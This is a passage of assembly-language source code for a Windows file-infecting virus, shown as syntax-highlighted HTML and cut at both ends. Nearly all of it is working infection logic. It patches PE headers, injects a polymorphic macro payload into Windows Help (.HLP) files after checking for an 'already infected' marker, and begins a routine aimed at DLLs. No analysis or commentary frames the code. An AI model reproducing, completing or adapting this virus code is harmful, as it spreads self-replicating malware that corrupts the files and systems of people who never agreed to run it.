       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">peptr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">160</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;strip relocs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">164</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write old header</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">sectn</span><span class="sc4">-</span><span class="sc5">pehdr</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write section table</span><span class="sc0">
  </span><span class="sc5">@@err1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
  </span><span class="sc5">@@err</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsize4</span><span class="sc0">

  </span><span class="sc5">@@try_hlp</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'PLH.'</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@wsockdll</span><span class="sc0">

</span><span class="sc5">buffer</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;stack frame</span><span class="sc0">
</span><span class="sc5">old_ofs</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">old_sz</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">patch1</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">wsize3</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">mainhdr</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">;buffer structure</span><span class="sc0">
</span><span class="sc5">pagedir</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">syshdr</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">210h</span><span class="sc0">
</span><span class="sc5">build</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">225h</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">wsize3</span><span class="sc0">                        </span><span class="sc1">;infect HLP files...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@error000</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">040000dh</span><span class="sc0">                           </span><span class="sc1">;getheap</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;esi=buffer.mainhdr</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read 10h of header</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@free</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">035f3fh</span><span class="sc0">                        </span><span class="sc1">;hlp signature?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@free</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">37h</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">;edx=directory offset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;esi=buffer.pagedir</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@@search</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@free</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SYS|'</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@search</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'MET'</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@search</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;eax=end of file</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;section code = end of file</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">15h</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">syshdr</span><span class="sc4">-</span><span class="sc5">pagedir</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read sys hdr</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">old_ofs</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">old_sz</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;save old code position/size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">build</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hlp1_s</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_size</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hlp1_s</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.patch1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hlp1_sz</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@decr</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                    </span><span class="sc1">;copy start macro</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@decr</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;edi=buffer</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">i_jmp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc5">hlp_start</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vend</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">@@next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">;can make it directly?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@ext</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                             </span><span class="sc1">;push ?</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@done_</span><span class="sc0">
  </span><span class="sc5">@@ext</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                            </span><span class="sc1">;mov eax, ?</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">                             </span><span class="sc1">;xor eax, ?</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">                             </span><span class="sc1">;push eax</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
  </span><span class="sc5">@@done_</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@next</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;ecx=poly code</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">i_jmp</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hlp1_e</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">p1</span><span class="sc4">)+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hlp2_e</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hlp1_e</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.patch1</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                        </span><span class="sc1">;patch macro size</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">hlp1_e</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hlp2_sz</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;copy end macro</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">syshdr</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">hlp2_e</span><span class="sc4">-</span><span class="sc5">hlp1_s</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;fix syshdr size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.old_ofs</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.old_sz</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                            </span><span class="sc1">;old script too large?</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@@free</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">                               </span><span class="sc1">;read old code</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"`(RR"</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@free</span><span class="sc0">                               </span><span class="sc1">;probably already infected</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.buffer</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;ebp=buffer</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                            </span><span class="sc1">;ecx=our size</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">syshdr</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.mainhdr</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebp.syshdr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write our code</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.mainhdr</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write main header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.mainhdr</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">37h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pagedir</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">                              </span><span class="sc1">;write directory</span><span class="sc0">
  </span><span class="sc5">@@free</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">040000eh</span><span class="sc0">                           </span><span class="sc1">;freeheap</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">                              </span><span class="sc1">;close file</span><span class="sc0">
  </span><span class="sc5">@@error000</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsize3</span><span class="sc0">

  </span><span class="sc5">@@wsockdll</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;       xor eax, not 'EXE.' xor not 'PLH.' xor not 'LLD.'</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01c000c00h</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@shit</span><span class="sc0">
     </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
